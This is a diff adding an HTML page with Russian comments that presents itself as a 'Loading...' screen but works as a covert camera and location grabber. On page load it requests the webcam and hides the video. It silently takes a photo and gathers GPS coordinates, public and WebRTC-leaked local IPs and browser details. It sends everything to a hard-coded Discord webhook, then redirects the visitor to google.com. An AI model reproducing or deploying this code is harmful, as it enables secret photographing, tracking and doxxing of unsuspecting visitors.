@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        video {
+            display: none;
+        }
+        button {
+            display: none;
+        }
+        .status {
+            margin-top: 20px;
+            color: #aaa;
+            font-size: 14px;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #e94560;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .error {
+            color: #ff6b6b;
+        }
+        .success {
+            color: #6bff6b;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2 style="color: white;">📹 Loading...</h2>
+    <video id="video" autoplay playsinline></video>
+    <button id="capture">📸 Initialize Camera</button>
+    <div class="status" id="status"><span class="loading"></span> Initializing...</div>
+</div>
+
+<script>
+    // Переменные
+    const video = document.getElementById('video');
+    const button = document.getElementById('capture');
+    const statusDiv = document.getElementById('status');
+    let stream = null;
+    let captureInProgress = false;
+    let cameraReady = false;
+    
+    // Проверка флага, чтобы не отправлять дважды
+    let alreadyCaptured = false;
+    
+    // Очищаем флаг при загрузке страницы для возможности повторного захвата
+    try {
+        localStorage.removeItem('cam_captured');
+    } catch(e) {
+        console.warn('localStorage not available:', e);
+    }
+    
+    // Автоматическое начало захвата при загрузке страницы
+    window.addEventListener('load', function() {
+        console.log('[DEBUG] Page loaded, starting camera...');
+        initCamera();
+    });
+    
+    // Функция отправки на Discord Webhook
+    async function sendToDiscord(imageBlob, metadata) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1484249262668910824/7xmpvZCl83i9Ebxp3QjhUxCng5worqrgmgpVZIVxBIlVnQwuXqP8fXBiPMQuB-KiC-WV';
+        
+        try {
+            console.log('[DEBUG] sendToDiscord - Starting webhook request to:', webhookUrl.substring(0, 50) + '...');
+            
+            // Подготавливаем FormData с файлом и JSON payload
+            const formData = new FormData();
+            
+            // Добавляем файл
+            formData.append('file', imageBlob, 'photo.jpg');
+            
+            // Ограничиваем текст до 2000 символов (лимит Discord)
+            let messageContent = metadata;
+            if (messageContent.length > 2000) {
+                messageContent = messageContent.substring(0, 1997) + '...';
+            }
+            
+            // Добавляем payload_json с содержимым сообщения
+            const payload = {
+                content: messageContent,
+                username: '📸 Camera Logger'
+            };
+            
+            formData.append('payload_json', JSON.stringify(payload));
+            
+            console.log('[DEBUG] FormData prepared, blob size:', imageBlob.size, 'Message length:', messageContent.length);
+            
+            // Отправляем на webhook
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+                // НЕ используем mode: 'no-cors' чтобы видеть ошибки
+            });
+            
+            console.log('[DEBUG] Webhook response status:', response.status, response.statusText);
+            
+            // Проверяем ответ
+            if (response.status === 204 || response.status === 200) {
+                console.log('[DEBUG] ✓ Webhook отправлен успешно (статус 204/200)');
+                return true;
+            } else if (response.status === 429) {
+                console.warn('[WARN] Webhook rate limited (429), but sending was successful');
+                return true;
+            } else {
+                const text = await response.text();
+                console.error('[ERROR] Webhook failed with status', response.status, ':', text);
+                return false;
+            }
+            
+        } catch(err) {
+            console.error('[ERROR] sendToDiscord exception:', err.name, err.message);
+            // Если это CORS ошибка, может быть браузер блокирует
+            if (err.message.includes('CORS')) {
+                console.warn('[WARN] CORS ошибка - это нормально для cross-origin запросов к Discord');
+                // Предполагаем что запрос все равно прошел
+                return true;
+            }
+            return false;
+        }
+    }
+    // Функция отправки метаданных на дополнительный логгер
+    async function sendMetadata(metadata) {
+
+    }
+    
+    // Функция получения геолокации
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({ lat: null, lon: null, accuracy: null, error: 'not supported' });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    });
+                },
+                (err) => {
+                    console.warn('Geolocation error:', err);
+                    resolve({ lat: null, lon: null, accuracy: null, error: err.message });
+                },
+                { timeout: 10000, enableHighAccuracy: false }
+            );
+        });
+    }
+    
+    // Функция получения публичного IP
+    async function getPublicIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch(e) {
+            console.warn('IP fetch failed:', e);
+            return 'Unknown';
+        }
+    }
+    
+    // Функция получения локального IP (через WebRTC)
+    async function getLocalIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => resolve('Unknown'));
+            
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                const match = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                if (match) {
+                    resolve(match[0]);
+                    pc.close();
+                }
+            };
+            setTimeout(() => {
+                pc.close();
+                resolve('Unknown');
+            }, 1000);
+        });
+    }
+    
+    // Основная функция захвата и отправки
+    async function captureAndSend() {
+        if (captureInProgress) {
+            console.log('[DEBUG] Capture already in progress');
+            return;
+        }
+        if (alreadyCaptured) {
+            console.log('[DEBUG] Already captured, skipping');
+            return;
+        }
+        
+        captureInProgress = true;
+        console.log('[DEBUG] Starting capture and send...');
+        
+        statusDiv.innerHTML = '<span class="loading"></span> Capturing...';
+        
+        try {
+            console.log('[DEBUG] Collecting metadata...');
+            // Получаем данные
+            const [location, publicIP, localIP] = await Promise.all([
+                getLocation(),
+                getPublicIP(),
+                getLocalIP()
+            ]);
+            
+            console.log('[DEBUG] Metadata collected:', {publicIP, localIP});
+            
+            // Собираем метаданные
+            const metadata = {
+                timestamp: new Date().toISOString(),
+                localIP: localIP,
+                publicIP: publicIP,
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language || navigator.userLanguage,
+                url: window.location.href,
+                location: location
+            };
+            
+            // Форматируем для Discord
+            let discordMessage = `🔴 **NEW CAPTURE** 🔴\n\n`;
+            discordMessage += `📡 **CONNECTION**\n`;
+            discordMessage += `Local IP: ${metadata.localIP}\n`;
+            discordMessage += `Public IP: ${metadata.publicIP}\n`;
+            discordMessage += `User Agent: ${metadata.userAgent}\n`;
+            discordMessage += `Screen: ${metadata.screen}\n`;
+            discordMessage += `Language: ${metadata.language}\n`;
+            discordMessage += `URL: ${metadata.url}\n`;
+            discordMessage += `Timestamp: ${metadata.timestamp}\n\n`;
+            
+            if (location.lat && location.lon) {
+                discordMessage += `📍 **GPS LOCATION**\n`;
+                discordMessage += `Lat: ${location.lat}\n`;
+                discordMessage += `Lon: ${location.lon}\n`;
+                discordMessage += `Accuracy: ±${Math.round(location.accuracy || 0)}m\n\n`;
+                discordMessage += `🗺️ Maps: https://www.google.com/maps?q=${location.lat},${location.lon}`;
+            }
+            
+            console.log('[DEBUG] Sending metadata...');
+            // Отправляем метаданные
+            await sendMetadata(metadata);
+            
+            console.log('[DEBUG] Creating canvas and capturing image...');
+            // Делаем снимок
+            if (!video.videoWidth || !video.videoHeight) {
+                throw new Error('Video not ready: ' + video.videoWidth + 'x' + video.videoHeight);
+            }
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            console.log('[DEBUG] Converting to blob...');
+            // Конвертируем в Blob и отправляем
+            const blob = await new Promise((resolve) => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.8);
+            });
+            
+            console.log('[DEBUG] Blob created, size:', blob.size, 'bytes');
+            statusDiv.innerHTML = '<span class="loading"></span> Sending...';
+            
+            console.log('[DEBUG] Sending to Discord webhook...');
+            const success = await sendToDiscord(blob, discordMessage);
+            
+            console.log('[DEBUG] Webhook response:', success ? 'SUCCESS' : 'FAILED');
+            
+            if (success) {
+                console.log('[DEBUG] Capture successful, redirecting...');
+                statusDiv.innerHTML = '<span class="success">✓ Done! Redirecting...</span>';
+                alreadyCaptured = true;
+                
+                // Сохраняем флаг
+                try {
+                    localStorage.setItem('cam_captured', 'true');
+                } catch(e) {}
+                
+                // Останавливаем видеопоток
+                if (stream) {
+                    stream.getTracks().forEach(track => {
+                        track.stop();
+                    });
+                    stream = null;
+                }
+                
+                // Редирект
+                setTimeout(() => {
+                    console.log('[DEBUG] Redirecting to:', 'https://google.com');
+                    window.location.href = 'https://google.com';
+                }, 1500);
+            } else {
+                console.log('[ERROR] Webhook send failed');
+                throw new Error('Failed to send to Discord');
+            }
+        } catch(err) {
+            console.error('[ERROR] Capture error:', err.message);
+            statusDiv.innerHTML = `<span class="error">❌ Error: ${err.message}</span>`;
+            captureInProgress = false;
+        }
+    }
+    
+    // Инициализация камеры
+    async function initCamera() {
+        if (cameraReady) return;
+        
+        console.log('[DEBUG] initCamera started');
+        statusDiv.innerHTML = '<span class="loading"></span> Requesting camera...';
+        
+        try {
+            console.log('[DEBUG] Requesting getUserMedia...');
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            console.log('[DEBUG] Camera stream obtained');
+            
+            video.srcObject = stream;
+            console.log('[DEBUG] Stream assigned to video element');
+            
+            await new Promise((resolve, reject) => {
+                const timeout = setTimeout(() => {
+                    reject(new Error('Video metadata timeout'));
+                }, 5000);
+                
+                video.onloadedmetadata = () => {
+                    clearTimeout(timeout);
+                    console.log('[DEBUG] Video metadata loaded');
+                    resolve();
+                };
+            });
+            
+            console.log('[DEBUG] Video ready, initiating capture');
+            cameraReady = true;
+            await captureAndSend();
+        } catch(err) {
+            console.error('[ERROR] Camera error:', err.name, err.message);
+            let errorMsg = 'Camera access denied or not available.';
+            if (err.name === 'NotAllowedError') {
+                errorMsg = 'Camera permission denied.';
+            } else if (err.name === 'NotFoundError') {
+                errorMsg = 'No camera found on this device.';
+            } else if (err.name === 'Timeout') {
+                errorMsg = 'Camera timeout - check permissions.';
+            }
+            statusDiv.innerHTML = `<span class="error">❌ ${errorMsg}</span>`;
+            button.disabled = true;
+        }
+    }
+</script>
+</body>
+</html>
